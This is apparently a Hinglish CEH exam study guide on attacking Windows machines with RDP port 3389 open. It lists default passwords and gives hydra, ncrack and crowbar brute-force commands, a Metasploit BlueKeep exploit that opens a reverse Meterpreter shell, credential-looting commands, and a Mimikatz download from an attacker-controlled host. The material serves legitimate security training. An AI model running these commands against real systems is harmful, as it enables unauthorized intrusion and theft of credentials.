# RDP PORT OPEN (3389) — Ab Kya Karu?

---

## Pehle Samjho: RDP Kya Hai?

RDP (Remote Desktop Protocol) Microsoft ka protocol hai jo **graphical remote access** deta hai — matlab tum doosri Windows machine ka **desktop** apni screen pe dekh sakte ho, mouse aur keyboard use kar sakte ho, jaise us machine ke saamne baithe ho.

Jab nmap mein port **3389** open dikhta hai, toh samjho:

- Target ek **Windows machine** hai (RDP sirf Windows pe chalta hai natively)
- Agar creds mil jaayein toh **full desktop access** milega
- Desktop pe **flags** directly dikh sakte hain (files, shortcuts)
- **GUI applications** use kar sakte ho (browser, file explorer, cmd, PowerShell)
- Password brute force se creds mil sakte hain
- Purane Windows versions mein **BlueKeep (CVE-2019-0708)** vulnerability hai — bina creds ke exploit ho sakta hai!

**SSH vs RDP:**
- SSH → Command line (text-based) → Linux machines pe
- RDP → Full desktop (graphical) → Windows machines pe

**CEH Exam mein RDP:** Usually kisi aur service se creds milte hain (FTP, SMB, Web, MySQL) aur phir RDP pe login karte ho Windows machine explore karne ke liye. Direct brute force bhi aata hai kabhi kabhi.

---

## Step 1: Nmap Se RDP Confirm Aur Details Check Karo

```bash
nmap -sV -sC -p 3389 <TARGET_IP>
```

Output:
```
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WIN-SERVER
|   NetBIOS_Domain_Name: WORKGROUP
|   DNS_Computer_Name: Win-Server
|   Product_Version: 10.0.17763
|_  System_Time: 2024-01-15T10:30:00+00:00
```

**Kya dhyan dena hai:**
- **Target_Name / DNS_Computer_Name** → Machine ka naam (username guess mein help karega)
- **Product_Version** → Windows version (purana hai toh BlueKeep check karo)
  - `6.1` → Windows 7 / Server 2008 R2 (BlueKeep VULNERABLE!)
  - `6.3` → Windows 8.1 / Server 2012 R2
  - `10.0` → Windows 10 / Server 2016/2019

### RDP Specific Scripts:
```bash
nmap --script rdp-enum-encryption -p 3389 <TARGET_IP>
nmap --script rdp-vuln-ms12-020 -p 3389 <TARGET_IP>
```

---

## Step 2: Default / Known Credentials Try Karo (PEHLE YEH)

### xfreerdp Se Connect Karo (Best Tool):
```bash
xfreerdp /v:<TARGET_IP> /u:administrator /p:password
xfreerdp /v:<TARGET_IP> /u:administrator /p:admin
xfreerdp /v:<TARGET_IP> /u:admin /p:admin
xfreerdp /v:<TARGET_IP> /u:admin /p:password123
xfreerdp /v:<TARGET_IP> /u:admin /p:Password1
```

**xfreerdp command samjho:**
- `/v:<IP>` → target IP (v = server)
- `/u:admin` → username
- `/p:password` → password
- `/cert-ignore` → SSL certificate warning skip karo (add karo agar error aaye)
- `/size:1024x768` → screen resolution set karo (optional)

**Full command with common options:**
```bash
xfreerdp /v:<TARGET_IP> /u:administrator /p:password /cert-ignore /size:1280x720
```

### rdesktop Se (Alternative, Simpler):
```bash
rdesktop <TARGET_IP> -u admin -p password
rdesktop <TARGET_IP> -u administrator -p admin
```

**Common Windows Default Credentials:**
| Username | Password |
|---|---|
| administrator | (empty) |
| administrator | password |
| administrator | admin |
| administrator | Password1 |
| admin | admin |
| admin | password |
| admin | password123 |
| user | user |
| test | test |

**Kya hoga:**
- Desktop dikha → **Login successful!** Step 4 pe jao
- `ERRCONNECT_LOGON_FAILURE` ya `LOGON_FAILURE` → Wrong credentials, Step 3 pe jao
- `ERRCONNECT_CONNECT_TRANSPORT_FAILED` → Network issue ya firewall
- Certificate warning → `/cert-ignore` add karo command mein
- `NLA required` → Network Level Authentication enabled hai, valid creds zaroori hain

**NLA Error Fix:**
```bash
xfreerdp /v:<TARGET_IP> /u:admin /p:password /cert-ignore /sec:nla
# Ya NLA disable karke:
xfreerdp /v:<TARGET_IP> /u:admin /p:password /cert-ignore /sec:rdp
```

---

## Step 3: Brute Force RDP Login

**WARNING:** RDP brute force SLOW hai aur account lockout ho sakta hai. `-t 4` se zyada threads KABHI mat rakho!

### Hydra Se:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> rdp -t 4
hydra -l administrator -P /usr/share/wordlists/rockyou.txt <TARGET_IP> rdp -t 4
hydra -L users.txt -P passwords.txt <TARGET_IP> rdp -t 4
```

### Ncrack Se (RDP Ke Liye Better):
```bash
ncrack -vv -u admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP>:3389
ncrack -vv -u administrator -P /usr/share/wordlists/rockyou.txt <TARGET_IP>:3389
```

### Crowbar Se (Specifically RDP Ke Liye Bana):
```bash
crowbar -b rdp -s <TARGET_IP>/32 -u admin -C /usr/share/wordlists/rockyou.txt
crowbar -b rdp -s <TARGET_IP>/32 -U users.txt -C /usr/share/wordlists/rockyou.txt
```

**Crowbar command samjho:**
- `-b rdp` → protocol (b = brute force type)
- `-s <IP>/32` → target (CIDR format mein dena padta hai, `/32` = single host)
- `-u admin` → username
- `-U users.txt` → users file
- `-C rockyou.txt` → password file (C = credentials)

**Users kahan se laayenge?**
- `enum4linux -U <IP>` (SMB se)
- `net user` (agar kisi aur Windows machine pe access hai)
- Nmap RDP script se hostname mila → hostname-based guess (WIN-SERVER → server, admin)
- Common: `administrator`, `admin`, `user`, `test`, target machine ka naam

**Pro Tip:** Pehle choti wordlist try karo (top 100 passwords) — RDP slow hai, poora rockyou bahut time lagega:
```bash
hydra -l admin -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> rdp -t 4
```

---

## Step 4: RDP Login Ho Gaya — Post Exploit Windows Desktop

Desktop dikhne laga toh ab ye karo:

### CMD (Command Prompt) Open Karo:
- Start Menu → type `cmd` → Enter
- Ya Win+R → type `cmd` → Enter
- Ya desktop pe right-click → "Open command prompt here"

### Basic Information Gathering:
```cmd
whoami                                    # kaun ho tum?
hostname                                  # machine ka naam
systeminfo                                # poora system info (OS version, patches, etc.)
ipconfig /all                             # network configuration
net user                                  # saare local users
net localgroup administrators             # admin group mein kaun hai
net user administrator                    # administrator account details
```

### FLAG DHUNDO (Exam Mein Ye Zaroori!):

**Common flag locations Windows mein:**
```cmd
type C:\flag.txt
type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Admin\Desktop\flag.txt
type C:\Users\Public\Desktop\flag.txt
type C:\Users\Administrator\Documents\flag.txt

:: Poore system mein flag search:
dir /s /b C:\*flag*
dir /s /b C:\*secret*
dir /s /b C:\*proof*

:: Har user ke Desktop pe dekho:
dir C:\Users\*\Desktop\*
dir C:\Users\*\Documents\*
```

**Pro Tip:** File Explorer bhi use karo — GUI mein dikh jayega agar Desktop pe file hai toh!

### Sensitive Files Dhundo:
```cmd
:: SAM database (password hashes):
type C:\Windows\System32\config\SAM
:: (usually locked, but check)

:: Unattended install files (plaintext passwords!):
type C:\Windows\Panther\unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\Sysprep\unattend.xml

:: Saved credentials:
cmdkey /list

:: WiFi passwords:
netsh wlan show profiles
netsh wlan show profile name="<PROFILE>" key=clear

:: Registry mein auto-login creds:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

### PowerShell Se (Zyada Powerful):
```powershell
# PowerShell open karo: Win+R → powershell

# System info:
Get-ComputerInfo | Select-Object CsName, WindowsVersion, OsArchitecture

# Users:
Get-LocalUser

# Flag search:
Get-ChildItem -Path C:\ -Filter "*flag*" -Recurse -ErrorAction SilentlyContinue

# Hidden files bhi:
Get-ChildItem -Path C:\ -Filter "*flag*" -Recurse -Force -ErrorAction SilentlyContinue

# Running processes:
Get-Process

# Installed software:
Get-WmiObject -Class Win32_Product | Select-Object Name, Version
```

---

## Step 5: BlueKeep Vulnerability (CVE-2019-0708)

BlueKeep ek **critical RDP vulnerability** hai jo **Windows 7, Server 2008, Server 2008 R2** pe kaam karti hai. Bina credentials ke **Remote Code Execution** mil sakta hai!

### Step A: Check Karo Vulnerable Hai Ya Nahi

**Nmap se:**
```bash
nmap --script rdp-vuln-ms12-020 -p 3389 <TARGET_IP>
```

**Metasploit scanner se:**
```bash
msfconsole -q
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <TARGET_IP>
run
```

Output mein `VULNERABLE` dikhega agar exploit kaam karega.

### Step B: Exploit Karo (Agar Vulnerable Hai)

```bash
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
set TARGET 1                   # Target OS select karo (show targets se list dekho)
run
```

**Targets:**
```
show targets
# 0: Automatic
# 1: Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
# 2: Windows 7 SP1 / 2008 R2 (6.1.7601 x64) - Virtualbox
# etc.
```

**WARNING:** BlueKeep exploit unstable hai — target machine **crash (BSOD)** ho sakti hai. Exam mein carefully use karo. Pehle scanner se confirm karo, phir exploit try karo.

**Kya hoga:** Agar sab sahi raha toh **Meterpreter shell** milega — bina kisi login ke!

```bash
meterpreter > getuid            # NT AUTHORITY\SYSTEM (full access!)
meterpreter > sysinfo
meterpreter > hashdump          # password hashes dump
meterpreter > shell             # CMD shell
C:\> type C:\Users\Administrator\Desktop\flag.txt
```

### MS12-020 (RDP DoS) Check Bhi:
```bash
nmap --script rdp-vuln-ms12-020 -p 3389 <TARGET_IP>

# Metasploit:
use auxiliary/scanner/rdp/ms12_020_check
set RHOSTS <TARGET_IP>
run
```

MS12-020 mainly **denial of service** hai — machine crash kar deta hai. CEH exam mein detect karne tak hi poochte hain usually.

---

## Step 6: Credential Reuse — Doosri Service Se Mile, RDP Pe Try

Ye SABSE COMMON scenario hai exam mein:

```bash
# FTP se mile creds:
xfreerdp /v:<TARGET_IP> /u:ftpuser /p:ftppass123 /cert-ignore

# MySQL se mile creds:
xfreerdp /v:<TARGET_IP> /u:dbadmin /p:dbpassword /cert-ignore

# SMB se mile creds:
xfreerdp /v:<TARGET_IP> /u:smbuser /p:smbpass /cert-ignore

# Web app se mile creds:
xfreerdp /v:<TARGET_IP> /u:webadmin /p:web123 /cert-ignore

# Hash crack ke baad:
xfreerdp /v:<TARGET_IP> /u:administrator /p:crackedpassword /cert-ignore
```

**Aur RDP se mile creds doosri jagah:**
```bash
# RDP machine pe database creds mile (config files mein):
mysql -h <OTHER_IP> -u root -p'found_password'

# RDP machine pe SSH key mili:
# Key copy karo → ssh -i key user@<OTHER_IP>

# RDP machine pe doosre users ke creds mile:
ssh other_user@<OTHER_IP>
```

---

## Step 7: Mimikatz — Passwords Dump (Agar Admin Ho)

Agar RDP se login ke baad tum **Administrator** ho:

### Option A: Mimikatz Download Aur Run:
```cmd
:: PowerShell se download (agar internet hai):
powershell -c "Invoke-WebRequest http://<YOUR_IP>/mimikatz.exe -OutFile C:\Users\Public\mimikatz.exe"

:: Run:
C:\Users\Public\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**Kya milega:** Saare logged-in users ke **plaintext passwords** ya **NTLM hashes**.

### Option B: Metasploit Meterpreter Se:
```bash
# Agar Meterpreter session hai:
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > kiwi_cmd sekurlsa::logonpasswords
```

### Option C: hashdump (Simpler):
```bash
meterpreter > hashdump
# Output:
# Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
# User:1001:aad3b435...:7b592e4f8178b4c75b3ef23c99e27ab7:::
```

Ye NTLM hashes hain — `john` ya `hashcat` se crack karo:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt hashes.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Common Mistakes (Mat Karna Ye):

1. **`/cert-ignore` nahi diya xfreerdp mein** — certificate error aayega aur connection fail hoga
2. **Brute force mein `-t` zyada rakha** — RDP bahut slow hai, `-t 4` se zyada mat karo nahi toh account lockout
3. **Sirf `cmd` use kiya, PowerShell nahi** — PowerShell bahut zyada powerful hai, recursive file search aur system info ke liye
4. **Desktop pe files nahi dekhe** — GUI mein hoke bhi sirf command line use kiya, Desktop pe flag directly pada ho sakta hai!
5. **`systeminfo` nahi chalaya** — ye OS version, patches sab batata hai, privilege escalation ke liye zaroori
6. **`net user` nahi kiya** — doosre users ke naam pata chalte hain jo brute force/credential reuse mein kaam aate hain
7. **BlueKeep check nahi kiya** — agar Windows 7/2008 hai toh HAMESHA check karo, bina creds ke shell mil sakta hai
8. **Credential reuse nahi kiya** — kisi aur service se creds mile toh PEHLE RDP pe try karo (Windows machine hai toh)
9. **`dir /s /b C:\*flag*` nahi chalaya** — poore system mein flag search karna zaroori hai
10. **Unattend.xml check nahi kiya** — Windows install files mein plaintext passwords hote hain

---

## Quick Decision Tree:

```
RDP open (port 3389)
  |
  ├─ nmap -sV -sC -p 3389 <IP> (VERSION + OS check)
  |   ├─ Windows 7 / Server 2008? → BlueKeep check (Step 5)
  |   └─ Hostname note karo → username guess mein help
  |
  ├─ Default creds try karo (PEHLE YEH)
  |   ├─ administrator:password, admin:admin, admin:password123
  |   ├─ xfreerdp /v:IP /u:admin /p:password /cert-ignore
  |   ├─ LOGIN HUA → Step 4 (Post-Exploit)
  |   └─ NAHI HUA → aage badho
  |
  ├─ Kisi aur service se creds mile? (FTP/SMB/Web/MySQL)
  |   ├─ HAAN → xfreerdp /v:IP /u:user /p:pass /cert-ignore
  |   └─ NAHI → Brute Force
  |
  ├─ Brute Force (SLOW — small wordlist pehle):
  |   ├─ hydra -l admin -P wordlist IP rdp -t 4
  |   ├─ ncrack / crowbar (RDP-specific tools)
  |   └─ Creds mile → Login → Post-Exploit
  |
  ├─ BlueKeep (CVE-2019-0708) — Windows 7/2008 only:
  |   ├─ auxiliary/scanner/rdp/cve_2019_0708_bluekeep → VULNERABLE?
  |   └─ exploit/windows/rdp/cve_2019_0708_bluekeep_rce → SYSTEM shell!
  |
  └─ Login hua → POST-EXPLOIT:
      ├─ whoami / hostname / systeminfo / net user
      ├─ dir /s /b C:\*flag* (FLAG DHUNDO)
      ├─ type C:\Users\Administrator\Desktop\flag.txt
      ├─ Sensitive files: unattend.xml, SAM, registry
      ├─ Mimikatz → plaintext passwords / NTLM hashes
      └─ Creds mile? → SSH/MySQL/SMB pe reuse karo
```
